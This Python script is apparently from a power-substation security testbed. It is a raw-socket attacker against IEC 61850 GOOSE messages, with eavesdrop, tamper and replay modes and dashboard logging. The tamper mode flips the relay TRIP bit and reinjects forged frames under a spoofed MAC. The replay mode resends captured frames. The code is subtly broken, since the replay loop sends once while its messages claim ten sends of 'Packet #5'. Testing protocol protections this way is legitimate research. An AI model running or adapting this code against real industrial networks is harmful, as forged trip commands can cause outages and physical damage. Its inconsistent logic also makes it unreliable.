#!/usr/bin/env python3
import time
import argparse
import socket
import struct
import json
import os

parser = argparse.ArgumentParser(description="Layer 2 GOOSE Adversary (Raw Sockets)")
parser.add_argument("--attack", type=str, choices=['eavesdrop', 'tamper', 'replay'], default='eavesdrop')
args = parser.parse_args()

GOOSE_TYPE = 0x88B8
IFACE = "h3-eth0"

captured_raw_frames = []
has_replayed = False  

# A fake MAC address to identify our own tampered packets so we don't process them twice
ATTACKER_MAC = b'\xde\xad\xbe\xef\x00\x00'

# --- WEB DASHBOARD LOGGING SETUP ---
LOG_FILE = "metrics/hacker_log.json"
os.makedirs("metrics", exist_ok=True)

# Wipe the log clean every time the hacker script starts
with open(LOG_FILE, "w") as f:
    json.dump([], f)

def log_attack_step(step_title, detail, status="info"):
    """Appends a step to the JSON log for the web dashboard."""
    try:
        with open(LOG_FILE, "r") as f:
            data = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        data = []
        
    data.append({
        "time": time.strftime("%H:%M:%S"), 
        "title": step_title, 
        "detail": detail, 
        "status": status
    })
    
    with open(LOG_FILE, "w") as f:
        json.dump(data, f)
# -----------------------------------

def start_hacker():
    global has_replayed
    
    print(f"[*] =======================================")
    print(f"[*] HACKER TERMINAL ONLINE | Interface: {IFACE}")
    print(f"[*] Attack Mode: {args.attack.upper()}")
    print(f"[*] =======================================\n")
    
    log_attack_step("Adversary Online", f"Listening on {IFACE}. Mode: {args.attack.upper()}", "info")
    
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(GOOSE_TYPE))
        sock.bind((IFACE, 0))
    except PermissionError:
        print("[!] Error: Raw sockets require root/sudo privileges.")
        log_attack_step("System Error", "Requires root/sudo privileges to bind raw sockets.", "danger")
        return

    while True:
        raw_frame = sock.recv(2048)
        
        # We expect at least 14 (Ethernet) + 8 (Timestamp) = 22 bytes
        if len(raw_frame) < 22: 
            continue
            
        eth_header = raw_frame[:14]
        src_mac = eth_header[6:12]
        
        # Ignore our own tampered packets to prevent routing loops
        if src_mac == ATTACKER_MAC:
            continue

        timestamp = raw_frame[14:22]
        secure_stream = raw_frame[22:]
        
        print(f"\n[!!!] INTERCEPTED GOOSE FRAME [!!!]")
        log_attack_step("Frame Intercepted", f"Captured {len(raw_frame)} byte GOOSE packet.", "info")
        
        # --- 1. EAVESDROP ATTACK (Breaks Confidentiality) ---
        if args.attack == 'eavesdrop':
            stolen_text = secure_stream.decode('ascii', errors='ignore')
            
            if "SEL_421" in stolen_text or "LLN0" in stolen_text:
                print("    [!] Status: VULNERABLE. Plaintext GOOSE structure detected.")
                clean_strings = ''.join([c if c.isprintable() else '.' for c in stolen_text])
                print(f"    [!] Extracted Data: {clean_strings[:60]}...")
                log_attack_step("Eavesdrop Success", f"VULNERABLE. Extracted plain data: {clean_strings[:60]}...", "danger")
            else:
                print(f"    [?] Status: SECURE. Payload appears to be encrypted/scrambled.")
                print(f"    [?] Ciphertext Bytes: {secure_stream[:15].hex()}... (Unreadable)")
                log_attack_step("Eavesdrop Failed", f"SECURE. Data is encrypted: {secure_stream[:15].hex()}...", "success")

        # --- 2. SURGICAL TAMPER ATTACK (Breaks Integrity / Authentication) ---
        elif args.attack == 'tamper':
            if len(secure_stream) > 0:
                last_byte = secure_stream[-1:]
                
                if last_byte == b'\x00':
                    tampered_stream = secure_stream[:-1] + b'\x0f'
                    print("    [!] TAMPER: Detected TRIP=FALSE. Flipping to TRIP=TRUE!")
                    log_attack_step("Payload Modification", "Flipped TRIP bit from FALSE to TRUE", "warning")
                else:
                    tampered_stream = secure_stream[:-1] + b'\x00'
                    print("    [!] TAMPER: Detected TRIP=TRUE. Flipping to TRIP=FALSE!")
                    log_attack_step("Payload Modification", "Flipped TRIP bit from TRUE to FALSE", "warning")
                
                forged_eth_header = eth_header[:6] + ATTACKER_MAC + eth_header[12:14]
                poisoned_frame = forged_eth_header + timestamp + tampered_stream
                
                time.sleep(0.005) 
                sock.send(poisoned_frame)
                
                print(f"    [+] Surgical Poison injected! Only the Trip bit was modified.")
                log_attack_step("Tamper Deployed", "Injected forged frame back onto the network. Awaiting Subscriber response...", "danger")

        # --- 3. REPLAY ATTACK (Breaks Freshness / Availability) ---
        elif args.attack == 'replay':
            captured_raw_frames.append(raw_frame)
            print(f"    [>] REPLAY: Packet captured. Stored: {len(captured_raw_frames)}")
            log_attack_step("Packet Recorded", f"Saved valid packet to memory (Count: {len(captured_raw_frames)})", "info")
            
            if len(captured_raw_frames) == 1 and not has_replayed:
                print("    [+] Triggering 10x Replay Attack!")
                print("    [+] Spoofing Publisher MAC and blasting Packet #5 TEN TIMES...")
                log_attack_step("Replay Attack Triggered", "Blasting older valid Packet #5 back onto the network 10 times...", "warning")
                
                # Loop to send the packet 10 times
                for i in range(1):
                    time.sleep(0.05) # 50ms delay between blasts
                    sock.send(captured_raw_frames[0]) 
                    print(f"    [+] Replay frame {i+1}/10 successfully blasted onto the wire!")
                
                has_replayed = True
                log_attack_step("Replay Deployed", "10 Frames successfully injected. Let's see if the Subscriber drops them...", "danger")

if __name__ == "__main__":
    start_hacker()